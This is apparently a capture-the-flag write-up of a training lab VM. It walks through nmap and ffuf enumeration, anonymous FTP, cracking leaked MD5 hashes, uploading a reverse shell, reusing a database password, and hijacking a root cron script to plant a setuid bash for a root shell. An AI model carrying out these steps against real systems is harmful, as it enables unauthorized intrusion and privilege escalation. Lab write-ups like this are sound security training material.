
IP - 192.168.18.247 

Started a nmap scan on the target 

```bash
nmap -A -p- -T4 192.168.18.247
```

Result : 

```
Nmap scan report for 192.168.18.247
Host is up (0.0039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.18.248
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:76:E4:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   3.87 ms 192.168.18.247

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.24 seconds

```


3 ports are open 

- ftp 
- ssh
- http

ftp has anonymous login enabled let's go and see is there something 

```
$ ftp 192.168.18.247
Connected to 192.168.18.247.
220 (vsFTPd 3.0.3)
Name (192.168.18.247:zero): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||26891|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
>get note.txt 
```

we got just one file in that ftp server that is `note.txt` and the contents are 

```
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```


This gives us the following clues : 

- We found three users : jdelta, Heath, Grimmie
- It seems the website uses the same password everywhere 
- and also the insertion of student details reveal a password 'cd73502828457d15655bbd7a63fb0bc8' and also regno is what used for login 
- it seems this a open-source project from 2020 maybe some outdated software used 

It appears the password is md5 hash lets crack it using http://crackstation.net 

cd73502828457d15655bbd7a63fb0bc8 : student 

now we know the password 

Let's enumerate the http page on port 80

let's go to http://192.168.18.247 

- It appears to be a default apache page 

Let's do a directory bruteforce and we found 

```bash
	ffuf -w /usr/share/wordlists/dirbuster/directory-2.3-medium.txt -u http://192.168.18.247/FUZZ 
```

- index.html -> it is the appache page
- phpmyadmin -> a admin login page 
- academy -> a student portal 
- academy/db -> contains a .sql file 
- academy/admin -> redirects to login page 

the .sql file obtained from academy/db contains admin creds like this

```sql


INSERT INTO `admin` (`id`, `username`, `password`, `creationDate`, `updationDate`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '2020-01-24 16:21:18', '03-06-2020 07:09:07 PM');


```

which gives us admin credentials 

admin : 21232f297a57a5a743894a0e4a801fc3 

after cracking using crackstation.net 

admin : admin 

But that doesn't get us anywhere 

the academy had a **upload file feature** , so we uploaded reverse shell 

As soon as uploaded we got a shell as **www-data** then going through the users we got grimmie and grimmie had a file **

**backup.sh**

```bash
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip

```

it just backs up /var/www/html/academy/includes upon vising there is a config.php file 

which contains 

```php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");

?>

```

A mysql password as the **clue** we got earlier from **note.txt** we know grimmie uses the same password everywhere

so we just switched user using the creds 

grimmie : My_V3ryS3cur3_P4ss

we used ssh with above creds to get a stable shell, Now we have a local user let's escalate privilege 

## Privilege Escalation : 

Let's check for suid bit permission files using 

```bash
find / -perm -u=s -type f 2>/dev/null
```

No result 

Let's look at crontab for current user as well as root 

```bash
crontab -l
crontab -u root -l 
```

both failed 

Then let's try `sudo -l ` it also fails

But thinking back there is a `backup.sh` script in the user it may run automatically at time intervals 

let's check for anything at time intervals using 

```bash
systemctl list-timers
```

that also didn't give us anything 

let's try the pspy which gives us a detailed information on running process and monitor processes 

download pspy from https://github.com/DominicBreuker/pspy

and transfer it into our machine by python http server 

```
python3 -m http.server 80
wget http://192.168.18.248/pspy64
```

let's run by making it executable 

```bash
chmod +x pspy64
./pspy64 
```

this script reveals the following command executes every minute 

```bash
2025/11/16 10:03:02 CMD: UID=0     PID=880    | /bin/sh -c /home/grimmie/backup.sh 

```

which reveals that the the backpu.sh file is executed as root every minute 

now we can change the content of backup.sh and get a root shell 

we just but the following script in backup.sh 

```bash 
#!/bin/bash

cp /bin/bash /tmp/bash
chmod +x /tmp/bash
chmod u+s /tmp/bash

```

which just create a bash binary on /tmp and give it suid 

then we can achieve root shell by using 

```bash
/tmp/bash -p 
```

which executes bash as its owner so we get a root shell

We can now read **/root/flag** 


```
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !

```




